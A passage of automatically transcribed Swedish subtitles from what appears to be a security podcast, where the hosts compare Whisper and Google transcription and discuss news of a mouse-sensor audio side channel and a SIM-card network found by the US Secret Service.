Dessutom då



`311 00:08:42,140 --> 00:08:43,320`
Transkribering



`312 00:08:43,320 --> 00:08:44,440`
Av alla avsnitt



`313 00:08:44,440 --> 00:08:45,260`
Ifall man nu



`314 00:08:45,260 --> 00:08:46,840`
Är döv



`315 00:08:46,840 --> 00:08:47,760`
Och gillar podcast



`316 00:08:47,760 --> 00:08:48,620`
Anta jag



`317 00:08:48,620 --> 00:08:50,560`
Herregud vad tråkigt



`318 00:08:50,560 --> 00:08:51,120`
Att sitta och läsa



`319 00:08:51,120 --> 00:08:52,340`
Men okej



`320 00:08:52,340 --> 00:08:53,500`
Läsa det



`321 00:08:53,500 --> 00:08:54,340`
Tycker man det är kanon?



`322 00:08:54,360 --> 00:08:54,860`
Hon gör det



`323 00:08:54,860 --> 00:08:56,100`
Det hade varit dödsmäktigt



`324 00:08:56,100 --> 00:08:56,940`
Om man har en sån



`325 00:08:56,940 --> 00:08:59,460`
Utan man läser med fingrarna



`326 00:08:59,460 --> 00:09:00,440`
Sån punktgrej



`327 00:09:00,440 --> 00:09:00,840`
Grej



`328 00:09:00,840 --> 00:09:02,880`
De finns ju även för



`329 00:09:02,880 --> 00:09:05,860`
För text på det sättet



`330 00:09:05,860 --> 00:09:06,080`
Svårt att göra



`331 00:09:06,080 --> 00:09:07,040`
Tänkte jag lyssna på våran



`332 00:09:07,040 --> 00:09:08,380`
Men nu



`333 00:09:08,380 --> 00:09:10,100`
Kan man inte bara lyssna då istället?



`334 00:09:10,180 --> 00:09:11,400`
Vad roligare om man läste



`335 00:09:11,400 --> 00:09:14,580`
Dövblint



`336 00:09:14,580 --> 00:09:17,420`
Kan du tänka er



`337 00:09:17,420 --> 00:09:18,860`
När vi pratade i mun på varandra



`338 00:09:18,860 --> 00:09:19,020`
Hur känns det



`339 00:09:19,020 --> 00:09:19,980`
Det är ett igen



`340 00:09:19,980 --> 00:09:20,980`
Nej



`341 00:09:20,980 --> 00:09:22,560`
Den där podcasten idag alltså



`342 00:09:22,560 --> 00:09:23,900`
Vi har spelat in avsnitt innan



`343 00:09:23,900 --> 00:09:24,320`
Så vi är lite



`344 00:09:24,320 --> 00:09:24,800`
Trötta nu



`345 00:09:24,800 --> 00:09:25,320`
Men



`346 00:09:25,320 --> 00:09:26,180`
Hej



`347 00:09:26,180 --> 00:09:27,220`
Det blir kul



`348 00:09:27,220 --> 00:09:28,200`
Jag har två frågor Peter



`349 00:09:28,200 --> 00:09:28,820`
Berätta allt



`350 00:09:28,820 --> 00:09:31,060`
Hur varmt blev din lägenhet



`351 00:09:31,060 --> 00:09:32,300`
Av att ditt 5090



`352 00:09:32,300 --> 00:09:34,180`
Stod och brummade i en dygn?



`353 00:09:35,660 --> 00:09:36,620`
Den var ju



`354 00:09:36,620 --> 00:09:37,780`
Stabilt på



`355 00:09:37,780 --> 00:09:40,200`
Mellan 80-85 grader



`356 00:09:40,200 --> 00:09:41,600`
Grafikkortet



`357 00:09:41,600 --> 00:09:42,340`
Och jag öppnade



`358 00:09:42,340 --> 00:09:43,200`
Fönstret



`359 00:09:43,200 --> 00:09:44,680`
Men



`360 00:09:44,680 --> 00:09:45,120`
Men



`361 00:09:45,120 --> 00:09:46,620`
Värmen



`362 00:09:46,620 --> 00:09:47,600`
Spred ju sig



`363 00:09:47,600 --> 00:09:48,040`
Och



`364 00:09:48,040 --> 00:09:49,860`
Du kunde ju känna



`365 00:09:49,860 --> 00:09:50,660`
Doften av allt



`366 00:09:50,660 --> 00:09:51,500`
Damm och annat



`367 00:09:51,500 --> 00:09:53,320`
Som fanns i hemmet



`368 00:09:53,320 --> 00:09:54,300`
För det blev ju



`369 00:09:54,300 --> 00:09:57,180`
Lite omkastat då



`370 00:09:57,180 --> 00:09:58,060`
Okej



`371 00:09:58,060 --> 00:09:58,980`
Så det var inte bara varmt



`372 00:09:58,980 --> 00:09:59,400`
Utan det blev



`373 00:09:59,400 --> 00:10:00,440`
Extra ventilation



`374 00:10:00,440 --> 00:10:02,560`
Det luktade söverhall



`375 00:10:02,560 --> 00:10:03,000`
I



`376 00:10:03,000 --> 00:10:04,960`
Min tatarum



`377 00:10:04,960 --> 00:10:05,700`
Det var min första fråga



`378 00:10:05,700 --> 00:10:06,760`
Den andra frågan är



`379 00:10:06,760 --> 00:10:08,280`
Har du gjort



`380 00:10:08,280 --> 00:10:09,320`
Något stickprov här



`381 00:10:09,320 --> 00:10:10,640`
Vad är kvaliteten



`382 00:10:10,640 --> 00:10:10,920`
Av



`383 00:10:10,920 --> 00:10:12,080`
Whispers



`384 00:10:12,080 --> 00:10:13,400`
Transkriperingsgabretta



`385 00:10:13,400 --> 00:10:14,680`
Alltså



`386 00:10:14,680 --> 00:10:15,820`
Lite olika



`387 00:10:15,820 --> 00:10:16,660`
Jag har klickat runt



`388 00:10:16,660 --> 00:10:17,120`
Litegrann



`389 00:10:17,120 --> 00:10:18,100`
Jag har inte gjort någon



`390 00:10:18,100 --> 00:10:19,260`
Noggrant studie



`391 00:10:19,260 --> 00:10:20,080`
Du har alltså inte gått igenom



`392 00:10:20,080 --> 00:10:21,100`
Nästan 300 avsnitt



`393 00:10:21,100 --> 00:10:21,580`
Nej



`394 00:10:21,580 --> 00:10:23,220`
Men jag har sett



`395 00:10:23,220 --> 00:10:24,180`
En tendens



`396 00:10:24,180 --> 00:10:25,020`
Satt upp en whisper



`397 00:10:25,020 --> 00:10:25,640`
Med



`398 00:10:25,640 --> 00:10:27,500`
Nollkonfiguration



`399 00:10:27,500 --> 00:10:28,260`
Det är ju effektivt



`400 00:10:28,260 --> 00:10:29,200`
Vad jag har gjort



`401 00:10:29,200 --> 00:10:31,020`
Så tenderar den ju



`402 00:10:31,020 --> 00:10:31,680`
Att ge



`403 00:10:31,680 --> 00:10:33,280`
Mycket kortare segment



`404 00:10:33,280 --> 00:10:34,200`
Transkriberade



`405 00:10:34,200 --> 00:10:35,000`
Än vad



`406 00:10:35,000 --> 00:10:36,060`
Google gör



`407 00:10:36,060 --> 00:10:37,840`
Vad betyder det?



`408 00:10:38,060 --> 00:10:38,620`
Jag förstår inte



`409 00:10:38,620 --> 00:10:39,000`
Vad du sa



`410 00:10:39,000 --> 00:10:40,440`
När Googles



`411 00:10:40,440 --> 00:10:41,140`
Transkribering



`412 00:10:41,140 --> 00:10:41,740`
Alltså det är mycket



`413 00:10:41,740 --> 00:10:44,040`
Det är långa paragrafer



`414 00:10:44,040 --> 00:10:44,840`
Det är mer



`415 00:10:44,840 --> 00:10:45,740`
Det är mer



`416 00:10:45,740 --> 00:10:46,700`
Det är mer tid



`417 00:10:46,700 --> 00:10:47,940`
Per textstycke



`418 00:10:47,940 --> 00:10:48,680`
Ja nu fattar jag



`419 00:10:48,680 --> 00:10:49,100`
Okej ja



`420 00:10:49,100 --> 00:10:49,920`
Det är rimligt



`421 00:10:49,920 --> 00:10:50,620`
För att du har



`422 00:10:50,620 --> 00:10:51,580`
Ett 50-90



`423 00:10:51,580 --> 00:10:53,460`
Ja men



`424 00:10:53,460 --> 00:10:53,880`
Men



`425 00:10:53,880 --> 00:10:55,540`
Det är bara



`426 00:10:55,540 --> 00:10:56,920`
Hur de beter sig



`427 00:10:56,920 --> 00:10:57,360`
Med det få



`428 00:10:57,360 --> 00:10:58,240`
Att konfigurationen



`429 00:10:58,240 --> 00:10:59,440`
Skiljer sig hyfsat mycket



`430 00:10:59,440 --> 00:11:02,300`
Men Open Whisper



`431 00:11:02,300 --> 00:11:03,540`
Verkar ju



`432 00:11:03,540 --> 00:11:04,960`
Stundtals



`433 00:11:04,960 --> 00:11:05,620`
Kunna förstås



`434 00:11:05,620 --> 00:11:06,340`
Väldigt bra



`435 00:11:06,340 --> 00:11:06,880`
Och



`436 00:11:06,880 --> 00:11:09,960`
Jag tycker



`437 00:11:09,960 --> 00:11:10,640`
Google



`438 00:11:10,640 --> 00:11:14,040`
Google ger bättre text



`439 00:11:14,040 --> 00:11:15,480`
Skulle jag kanske säga



`440 00:11:15,480 --> 00:11:16,920`
Men ofta är den ju



`441 00:11:16,920 --> 00:11:17,640`
Helt fel



`442 00:11:17,640 --> 00:11:19,680`
Jag skulle säga



`443 00:11:19,680 --> 00:11:20,500`
I vissa fall



`444 00:11:20,500 --> 00:11:21,040`
Kan du ha med



`445 00:11:21,040 --> 00:11:21,620`
Inund



`446 00:11:21,620 --> 00:11:22,360`
Inund data



`447 00:11:22,360 --> 00:11:22,840`
Till det här



`448 00:11:22,840 --> 00:11:23,640`
Men



`449 00:11:23,640 --> 00:11:24,680`
Jag tycker vi skönjer



`450 00:11:24,680 --> 00:11:25,140`
En viss



`451 00:11:25,140 --> 00:11:26,560`
Kronetisk översättning



`452 00:11:26,560 --> 00:11:27,080`
På vissa saker



`453 00:11:27,080 --> 00:11:28,120`
Men Open Whisper



`454 00:11:28,120 --> 00:11:28,800`
Verkar göra bättre



`455 00:11:28,800 --> 00:11:29,820`
Dessutom



`456 00:11:29,820 --> 00:11:31,180`
Den



`457 00:11:31,180 --> 00:11:33,160`
Båda de har ju tendensen



`458 00:11:33,160 --> 00:11:33,800`
Att



`459 00:11:33,800 --> 00:11:34,700`
Och då märker man



`460 00:11:34,700 --> 00:11:35,800`
Snackar engelska



`461 00:11:35,800 --> 00:11:37,260`
Så ignorerar den



`462 00:11:37,260 --> 00:11:38,060`
Allt det tillsägna



`463 00:11:38,060 --> 00:11:38,680`
Att den ska översätta



`464 00:11:38,680 --> 00:11:39,280`
Till svenska



`465 00:11:39,280 --> 00:11:40,180`
Det är även



`466 00:11:40,180 --> 00:11:42,080`
Vissa specialfall



`467 00:11:42,080 --> 00:11:43,600`
Sättat Open Whisper



`468 00:11:43,600 --> 00:11:45,840`
Spotar in



`469 00:11:45,840 --> 00:11:47,180`
Helt andra språk



`470 00:11:47,180 --> 00:11:47,620`
Med



`471 00:11:47,620 --> 00:11:49,320`
Alltså konstiga tecken



`472 00:11:49,320 --> 00:11:50,180`
Så



`473 00:11:50,180 --> 00:11:51,620`
Så vi har ju liksom



`474 00:11:51,620 --> 00:11:53,100`
Vi har ju gjort med



`475 00:11:53,100 --> 00:11:54,700`
Large har vi gjort



`476 00:11:54,700 --> 00:11:55,880`
Då



`477 00:11:55,880 --> 00:11:57,520`
Och Large innehåller ju



`478 00:11:57,520 --> 00:11:57,900`
Typ



`479 00:11:57,900 --> 00:11:59,580`
Nästan alla språk



`480 00:11:59,580 --> 00:12:00,200`
Den är



`481 00:12:00,200 --> 00:12:01,440`
Grundtränande



`482 00:12:01,440 --> 00:12:02,620`
Och språkförståelsen



`483 00:12:02,620 --> 00:12:03,960`
Är uppbyggd på engelska



`484 00:12:03,960 --> 00:12:05,020`
Och sen har den



`485 00:12:05,020 --> 00:12:05,840`
Efter träning



`486 00:12:05,840 --> 00:12:06,420`
Den har lärt sig



`487 00:12:06,420 --> 00:12:07,600`
Förstå massa andra språk



`488 00:12:07,600 --> 00:12:07,800`
Och



`489 00:12:07,800 --> 00:12:09,500`
Oftast så följer



`490 00:12:09,500 --> 00:12:10,520`
Instruktionerna



`491 00:12:10,520 --> 00:12:10,780`
Att



`492 00:12:10,780 --> 00:12:12,300`
Vi pratar svenska



`493 00:12:12,300 --> 00:12:14,180`
Lite bitvis



`494 00:12:14,180 --> 00:12:14,700`
Kan det komma



`495 00:12:14,700 --> 00:12:16,000`
Hord på



`496 00:12:16,000 --> 00:12:17,740`
Alltså jättekonstiga tecken



`497 00:12:17,740 --> 00:12:18,620`
Som inte ens jag vet



`498 00:12:18,620 --> 00:12:19,400`
Vilket språk det är



`499 00:12:19,400 --> 00:12:19,540`
Eller



`500 00:12:19,540 --> 00:12:21,940`
Jag har inte



`501 00:12:21,940 --> 00:12:22,680`
Spårat i det



`502 00:12:22,680 --> 00:12:22,980`
Men



`503 00:12:22,980 --> 00:12:25,120`
Så det finns



`504 00:12:25,120 --> 00:12:26,440`
Lustiga specialfall



`505 00:12:26,440 --> 00:12:27,520`
Intressant



`506 00:12:27,520 --> 00:12:28,780`
Hur mycket VRAM



`507 00:12:28,780 --> 00:12:29,420`
Använder den



`508 00:12:29,420 --> 00:12:30,020`
För den modellen



`509 00:12:30,020 --> 00:12:31,720`
De säger att den ska dra



`510 00:12:31,720 --> 00:12:34,080`
10 gig VRAM



`511 00:12:34,080 --> 00:12:35,560`
Jag observerade att



`512 00:12:35,560 --> 00:12:36,900`
Totalt sett



`513 00:12:36,900 --> 00:12:37,800`
Låg utilization



`514 00:12:37,800 --> 00:12:39,320`
På 12 gig



`515 00:12:39,320 --> 00:12:41,320`
Det vet jag inte om



`516 00:12:41,320 --> 00:12:42,460`
Det är



`517 00:12:42,460 --> 00:12:43,560`
Modellen



`518 00:12:43,560 --> 00:12:45,220`
Plus operativ system



`519 00:12:45,220 --> 00:12:45,960`
Eller om det är



`520 00:12:45,960 --> 00:12:46,560`
Bara att den är



`521 00:12:46,560 --> 00:12:47,600`
Av någon mån



`522 00:12:47,600 --> 00:12:48,480`
Den drar mer



`523 00:12:48,480 --> 00:12:49,700`
På det här kurset



`524 00:12:49,700 --> 00:12:50,320`
Eller någonting



`525 00:12:50,320 --> 00:12:52,300`
Prompt tokens



`526 00:12:52,300 --> 00:12:52,800`
Och



`527 00:12:52,980 --> 00:12:53,860`
Sånt som kan



`528 00:12:53,860 --> 00:12:54,200`
Eller ha



`529 00:12:54,200 --> 00:12:54,980`
Inputten



`530 00:12:54,980 --> 00:12:55,620`
Som kan vara



`531 00:12:55,620 --> 00:12:57,020`
Kräva VRAM också



`532 00:12:57,020 --> 00:12:58,000`
Den har ett



`533 00:12:58,000 --> 00:12:59,100`
Sliding context



`534 00:12:59,100 --> 00:12:59,620`
På



`535 00:12:59,620 --> 00:13:01,800`
30 sekunder



`536 00:13:01,800 --> 00:13:02,160`
Tydligen



`537 00:13:02,160 --> 00:13:07,480`
Men



`538 00:13:07,480 --> 00:13:08,220`
Gå in på



`539 00:13:08,220 --> 00:13:09,560`
Sakerhetspodcast.se



`540 00:13:09,560 --> 00:13:10,640`
Och surfa runt



`541 00:13:10,640 --> 00:13:11,100`
Några timmar



`542 00:13:11,100 --> 00:13:12,160`
Greja lite



`543 00:13:12,160 --> 00:13:13,640`
Det är värt det



`544 00:13:13,640 --> 00:13:14,320`
En upplevelse



`545 00:13:14,320 --> 00:13:14,700`
Faktiskt



`546 00:13:14,700 --> 00:13:16,700`
Vet du att ni håller på



`547 00:13:16,700 --> 00:13:17,580`
Att greja runt



`548 00:13:17,580 --> 00:13:18,580`
I mitt garage



`549 00:13:18,580 --> 00:13:19,600`
Nej



`550 00:13:19,600 --> 00:13:20,740`
Det gör man



`551 00:13:20,740 --> 00:13:22,020`
Men



`552 00:13:22,020 --> 00:13:22,960`
Vi ska vara lite



`553 00:13:22,960 --> 00:13:23,560`
Seriösa nu



`554 00:13:23,560 --> 00:13:24,340`
Prata om ett ämne



`555 00:13:24,340 --> 00:13:25,560`
Som har fått



`556 00:13:25,560 --> 00:13:26,660`
Liten musen



`557 00:13:26,660 --> 00:13:27,380`
Hör dig gråta



`558 00:13:27,380 --> 00:13:27,960`
I rymden



`559 00:13:27,960 --> 00:13:30,740`
Jag får såna bilder



`560 00:13:30,740 --> 00:13:31,380`
I sann



`561 00:13:31,380 --> 00:13:32,700`
I sann



`562 00:13:32,700 --> 00:13:33,540`
Säkerhetspodcast



`563 00:13:33,540 --> 00:13:34,240`
Alla



`564 00:13:34,240 --> 00:13:36,220`
Och det kommer bli bättre



`565 00:13:36,220 --> 00:13:37,260`
Håll ut



`566 00:13:37,260 --> 00:13:38,080`
Eller



`567 00:13:38,080 --> 00:13:40,160`
Muss



`568 00:13:40,160 --> 00:13:42,960`
De har ju en kamera



`569 00:13:42,960 --> 00:13:43,480`
Som



`570 00:13:43,480 --> 00:13:45,020`
Esterar nere



`571 00:13:45,020 --> 00:13:46,120`
I bordet



`572 00:13:46,120 --> 00:13:50,100`
Nu pratar vi inte om



`573 00:13:50,100 --> 00:13:51,180`
Levande muser



`574 00:13:51,180 --> 00:13:51,640`
Det är



`575 00:13:51,640 --> 00:13:52,660`
Datumers



`576 00:13:52,660 --> 00:13:52,940`
Datumers



`577 00:13:52,960 --> 00:13:53,680`
Datormus



`578 00:13:53,680 --> 00:13:56,340`
Lasermusar



`579 00:13:56,340 --> 00:13:57,180`
Yes



`580 00:13:57,180 --> 00:14:00,300`
Vilket gör ju att



`581 00:14:00,300 --> 00:14:03,100`
Musen vet ju



`582 00:14:03,100 --> 00:14:04,080`
Vad som händer



`583 00:14:04,080 --> 00:14:05,340`
Där den befinner sig



`584 00:14:05,340 --> 00:14:08,060`
Och den vet om världen skakar



`585 00:14:08,060 --> 00:14:10,360`
Eller om världen inte skakar



`586 00:14:10,360 --> 00:14:12,200`
Och så höjer vi



`587 00:14:12,200 --> 00:14:13,100`
Pollrate



`588 00:14:13,100 --> 00:14:15,440`
Stadigt mer och mer



`589 00:14:15,440 --> 00:14:19,100`
Och nu finns det en forskningsartikel



`590 00:14:19,100 --> 00:14:19,640`
Där de



`591 00:14:19,640 --> 00:14:21,900`
Demar att



`592 00:14:21,900 --> 00:14:22,940`
Det är



`593 00:14:22,960 --> 00:14:23,980`
Såna här



`594 00:14:23,980 --> 00:14:25,260`
Högfrekvensmuss



`595 00:14:25,260 --> 00:14:27,220`
Typ gamermuss



`596 00:14:27,220 --> 00:14:27,880`
Och liknande



`597 00:14:27,880 --> 00:14:28,840`
Och så de



`598 00:14:28,840 --> 00:14:30,560`
De dyra bra kvältet



`599 00:14:30,560 --> 00:14:31,260`
Till den mussen



`600 00:14:31,260 --> 00:14:33,300`
Du kan alltså



`601 00:14:33,300 --> 00:14:35,820`
Om du



`602 00:14:35,820 --> 00:14:36,980`
Observerar bilden



`603 00:14:36,980 --> 00:14:37,760`
Från dem hela tiden



`604 00:14:37,760 --> 00:14:38,760`
Så kan du



`605 00:14:38,760 --> 00:14:40,220`
Derivera fram



`606 00:14:40,220 --> 00:14:42,080`
Vilket ljud



`607 00:14:42,080 --> 00:14:43,340`
Som befinner sig i rummet



`608 00:14:43,340 --> 00:14:43,980`
Det är som att du har



`609 00:14:43,980 --> 00:14:45,220`
En lasermikrofon



`610 00:14:45,220 --> 00:14:46,400`
I rummet



`611 00:14:46,400 --> 00:14:46,640`
Typ



`612 00:14:46,640 --> 00:14:47,040`
Ja



`613 00:14:47,040 --> 00:14:48,780`
Och



`614 00:14:48,780 --> 00:14:50,780`
Du kan lyssna



`615 00:14:50,780 --> 00:14:51,400`
På



`616 00:14:51,400 --> 00:14:51,960`
Ljudet



`617 00:14:51,960 --> 00:14:52,600`
Ljudet



`618 00:14:52,600 --> 00:14:53,760`
Som är rekonstruerat



`619 00:14:53,760 --> 00:14:54,020`
Alltså



`620 00:14:54,020 --> 00:14:54,900`
Det är ju inte en



`621 00:14:54,900 --> 00:14:55,640`
Det är ju inte en



`622 00:14:55,640 --> 00:14:57,000`
Fin



`623 00:14:57,000 --> 00:14:58,400`
Aukustiskt



`624 00:14:58,400 --> 00:14:59,480`
Trevlig upplevelse



`625 00:14:59,480 --> 00:15:01,060`
Men för tydlig prat



`626 00:15:01,060 --> 00:15:01,540`
Ja



`627 00:15:01,540 --> 00:15:03,120`
Så kan du



`628 00:15:03,120 --> 00:15:04,620`
Du kan höra



`629 00:15:04,620 --> 00:15:05,900`
Vad som sägs i rummet



`630 00:15:05,900 --> 00:15:07,880`
Och de pratar väldigt tydligt



`631 00:15:07,880 --> 00:15:09,120`
När de rekonstruerar det



`632 00:15:09,120 --> 00:15:09,920`
Så att det är



`633 00:15:09,920 --> 00:15:10,840`
Väldigt pladdrig



`634 00:15:10,840 --> 00:15:11,820`
Ljudmiljö



`635 00:15:11,820 --> 00:15:12,280`
Kan du



`636 00:15:12,280 --> 00:15:13,900`
Anta att det är svårt



`637 00:15:13,900 --> 00:15:14,540`
Att få ut bra



`638 00:15:14,540 --> 00:15:14,920`
Och sådär



`639 00:15:14,920 --> 00:15:15,160`
Och



`640 00:15:15,160 --> 00:15:17,460`
Är det här forskning



`641 00:15:17,460 --> 00:15:17,920`
Utav



`642 00:15:17,920 --> 00:15:19,220`
Ben Gure



`643 00:15:19,220 --> 00:15:20,180`
Universitetet



`644 00:15:20,180 --> 00:15:20,700`
I Israel eller?



`645 00:15:20,700 --> 00:15:23,020`
De brukar göra



`646 00:15:23,020 --> 00:15:23,580`
Sådana här obsky



`647 00:15:23,580 --> 00:15:24,280`
Det känns ju lite



`648 00:15:24,280 --> 00:15:25,440`
Som att det är åt det hållet



`649 00:15:25,440 --> 00:15:26,540`
Det var bra



`650 00:15:26,540 --> 00:15:27,440`
Då vet man att vi kommer



`651 00:15:27,440 --> 00:15:28,420`
Att använda det till att



`652 00:15:28,420 --> 00:15:30,020`
Göra någonting bra



`653 00:15:30,020 --> 00:15:31,560`
Ja



`654 00:15:31,560 --> 00:15:33,800`
Jag har inte minnesbilden



`655 00:15:33,800 --> 00:15:34,800`
Att det faktiskt var



`656 00:15:34,800 --> 00:15:35,060`
De



`657 00:15:35,060 --> 00:15:35,400`
Men



`658 00:15:35,400 --> 00:15:36,300`
Jag var ju andra sådär



`659 00:15:36,300 --> 00:15:37,700`
Sjukt osäker nu



`660 00:15:37,700 --> 00:15:38,040`
Ja



`661 00:15:38,040 --> 00:15:39,400`
De brukar ju göra



`662 00:15:39,400 --> 00:15:39,820`
Mest



`663 00:15:39,820 --> 00:15:40,820`
Sådär knepiga



`664 00:15:40,820 --> 00:15:41,640`
Sidechannel



`665 00:15:41,640 --> 00:15:42,140`
Och



`666 00:15:42,140 --> 00:15:43,940`
Men även såhär



`667 00:15:43,940 --> 00:15:45,560`
Vad heter det



`668 00:15:45,560 --> 00:15:46,040`
Det heter det



`669 00:15:46,040 --> 00:15:46,480`
Air



`670 00:15:46,480 --> 00:15:47,560`
Air gap



`671 00:15:47,560 --> 00:15:48,020`
Pass



`672 00:15:48,020 --> 00:15:48,840`
Passering



`673 00:15:48,840 --> 00:15:50,260`
Cover channel



`674 00:15:50,260 --> 00:15:50,520`
Eller



`675 00:15:50,520 --> 00:15:50,680`
Och sådär



`676 00:15:50,700 --> 00:15:51,300`
Och air gap



`677 00:15:51,300 --> 00:15:52,960`
Och det här kanske inte riktigt ligger där



`678 00:15:52,960 --> 00:15:54,240`
Så att det skulle kunna vara



`679 00:15:54,240 --> 00:15:55,380`
Något annat ställe



`680 00:15:55,380 --> 00:15:57,060`
Ja



`681 00:15:57,060 --> 00:15:58,360`
Nej men det är ju likt



`682 00:15:58,360 --> 00:15:58,720`
Den här



`683 00:15:58,720 --> 00:16:00,740`
Derivera fram ljud



`684 00:16:00,740 --> 00:16:02,680`
Från bild på en chipspåse



`685 00:16:02,680 --> 00:16:04,000`
Liksom gjordes det ju



`686 00:16:04,000 --> 00:16:05,180`
För en öppent år sedan



`687 00:16:05,180 --> 00:16:05,540`
Sådär



`688 00:16:05,540 --> 00:16:05,740`
Men



`689 00:16:05,740 --> 00:16:06,960`
Det finns ju en lösning på detta



`690 00:16:06,960 --> 00:16:09,000`
Tror jag



`691 00:16:09,000 --> 00:16:10,060`
Vi lägger bara ut bilden



`692 00:16:10,060 --> 00:16:11,240`
På Jespers chipspåse



`693 00:16:11,240 --> 00:16:11,820`
På Youtube



`694 00:16:11,820 --> 00:16:12,640`
Så behöver vi inte



`695 00:16:12,640 --> 00:16:13,000`
Spela in



`696 00:16:13,000 --> 00:16:14,240`
Du lägger en vibrator



`697 00:16:14,240 --> 00:16:14,760`
Bredvid



`698 00:16:14,760 --> 00:16:15,600`
Ja



`699 00:16:15,600 --> 00:16:17,800`
Om det ännu inte



`700 00:16:17,800 --> 00:16:18,920`
Går att filtrera bort



`701 00:16:18,920 --> 00:16:20,520`
Men



`702 00:16:20,520 --> 00:16:21,200`
Men en annan



`703 00:16:21,200 --> 00:16:22,100`
En vibrator



`704 00:16:22,100 --> 00:16:22,940`
Med bra slumpdata



`705 00:16:22,940 --> 00:16:23,580`
En annan



`706 00:16:23,580 --> 00:16:24,380`
Varierad frekvens



`707 00:16:24,380 --> 00:16:25,160`
Nej men ha en



`708 00:16:25,160 --> 00:16:26,720`
Eller lägga musen



`709 00:16:26,720 --> 00:16:28,080`
I en bruslåda



`710 00:16:28,080 --> 00:16:30,520`
Eller ha en sämre mus



`711 00:16:30,520 --> 00:16:31,860`
Men lägre



`712 00:16:31,860 --> 00:16:32,480`
Uppdaterad



`713 00:16:32,480 --> 00:16:32,720`
Nej



`714 00:16:32,720 --> 00:16:34,260`
En gammal



`715 00:16:34,260 --> 00:16:35,080`
Hidil i kula



`716 00:16:35,080 --> 00:16:35,880`
Kul mus



`717 00:16:35,880 --> 00:16:36,120`
Ja



`718 00:16:36,120 --> 00:16:38,060`
En kul mus



`719 00:16:38,060 --> 00:16:39,420`
Ska man ta bort fluffet ibland



`720 00:16:39,420 --> 00:16:41,280`
Det var en mysig



`721 00:16:41,280 --> 00:16:41,440`
Jag trodde det



`722 00:16:41,440 --> 00:16:43,980`
Locka ludd



`723 00:16:43,980 --> 00:16:44,740`
Ja



`724 00:16:44,740 --> 00:16:45,660`
Kul



`725 00:16:45,660 --> 00:16:46,860`
Möss i rymden



`726 00:16:46,860 --> 00:16:48,220`
Men nu ska vi prata



`727 00:16:48,220 --> 00:16:49,420`
Vad hade du med rymden att göra



`728 00:16:49,420 --> 00:16:50,480`
Det här är det



`729 00:16:50,480 --> 00:16:53,440`
Vi bara skrev det på whitepodden



`730 00:16:53,440 --> 00:16:54,520`
Eller jag skrev det på whitepodden



`731 00:16:54,520 --> 00:16:55,440`
Fast det är inte riktigt sant



`732 00:16:55,440 --> 00:16:56,480`
För i rymden är det vakuum



`733 00:16:56,480 --> 00:16:58,280`
Och då hör du ingenting



`734 00:16:58,280 --> 00:16:59,200`
I rymden



`735 00:16:59,200 --> 00:16:59,740`
I rymden



`736 00:16:59,740 --> 00:17:00,820`
Sant



`737 00:17:00,820 --> 00:17:02,660`
Ja



`738 00:17:02,660 --> 00:17:04,080`
På tal om saker som lyssnar



`739 00:17:04,080 --> 00:17:05,180`
Berätta allt



`740 00:17:05,180 --> 00:17:05,420`
Ja



`741 00:17:05,420 --> 00:17:07,640`
Det här är en nyhet



`742 00:17:07,640 --> 00:17:08,660`
Som har några veckor på



`743 00:17:08,660 --> 00:17:09,600`
Nacken



`744 00:17:09,600 --> 00:17:10,800`
Nacken är ordet jag söker



`745 00:17:10,800 --> 00:17:11,020`
Tack



`746 00:17:11,020 --> 00:17:11,880`
Men



`747 00:17:11,880 --> 00:17:13,020`
Eller var den



`748 00:17:13,020 --> 00:17:14,060`
Men det blir konstigare bara



`749 00:17:14,060 --> 00:17:16,620`
US Secret Service då



`750 00:17:16,620 --> 00:17:18,460`
De hittade ett



`751 00:17:18,460 --> 00:17:20,460`
Ett nät



`752 00:17:20,480 --> 00:17:21,260`
Ja ett simkort



`753 00:17:21,260 --> 00:17:22,320`
De hittade en jävla massa simkort



`754 00:17:22,320 --> 00:17:23,440`
De hittade ett nät



`755 00:17:23,440 --> 00:17:23,840`
Med



`756 00:17:23,840 --> 00:17:25,520`
Med massa med simkort



`757 00:17:25,520 --> 00:17:26,960`
Det här var alltså



`758 00:17:26,960 --> 00:17:27,620`
Jag



`759 00:17:27,620 --> 00:17:29,760`
Jag kan inte de tekniska termerna här



`760 00:17:29,760 --> 00:17:30,240`
Men någon



`761 00:17:30,240 --> 00:17:31,500`
Något typ av



`762 00:17:31,500 --> 00:17:32,720`
För det var inte mobiltelefoner



`763 00:17:32,720 --> 00:17:34,000`
Men någon typ av



`764 00:17:34,000 --> 00:17:35,800`
Sim



`765 00:17:35,800 --> 00:17:37,780`
Eller telefoni



`766 00:17:37,780 --> 00:17:39,480`
Modem kan vi väl kalla det



`767 00:17:39,480 --> 00:17:40,600`
Förmodligen inte 3G



`768 00:17:40,600 --> 00:17:42,380`
Eftersom det är på väg bort



`769 00:17:42,380 --> 00:17:44,620`
Men någon form av mass



`770 00:17:44,620 --> 00:17:48,180`
Bygge av en massa



`771 00:17:48,180 --> 00:17:49,680`
Modem



`772 00:17:49,680 --> 00:17:50,400`
4G modem



`773 00:17:50,400 --> 00:17:50,460`
Förmodligen inte 3G



`774 00:17:50,480 --> 00:17:51,380`
5G modem antagligen



`775 00:17:51,380 --> 00:17:54,780`
Hittade de samlade



`776 00:17:54,780 --> 00:17:56,920`
På flera platser i New York



`777 00:17:56,920 --> 00:17:57,560`
Om jag inte minns mig



`778 00:17:57,560 --> 00:17:59,660`
Och det var rätt många



`779 00:17:59,660 --> 00:18:02,280`
Det var 300 locations



`780 00:18:02,280 --> 00:18:04,280`
Och tillsammans



`781 00:18:04,280 --> 00:18:05,960`
Över hundratusen simkort



`782 00:18:05,960 --> 00:18:06,940`
Det är en del



`783 00:18:06,940 --> 00:18:08,460`
Och det här var då



`784 00:18:08,460 --> 00:18:09,840`
Enligt Secret Service



`785 00:18:09,840 --> 00:18:12,700`
De kallade det för något



`786 00:18:12,700 --> 00:18:14,320`
Imminent threat



`787 00:18:14,320 --> 00:18:16,560`
To the agency's protective operations



`788 00:18:16,560 --> 00:18:18,900`
De skyddar väl presidenten



`789 00:18:18,900 --> 00:18:19,820`
Och lite annat kan jag tänka mig



`790 00:18:19,820 --> 00:18:20,400`
Och det var då



`791 00:18:20,400 --> 00:18:23,440`
Det användes



`792 00:18:23,440 --> 00:18:23,740`
Lite



`793 00:18:23,740 --> 00:18:24,700`
Säger jag inte riktigt



`794 00:18:24,700 --> 00:18:25,520`
För att jag vet inte om ni har hört



`795 00:18:25,520 --> 00:18:26,100`
Något mer om det här



`796 00:18:26,100 --> 00:18:26,300`
Men



`797 00:18:26,300 --> 00:18:28,520`
Vad hotet skulle vara



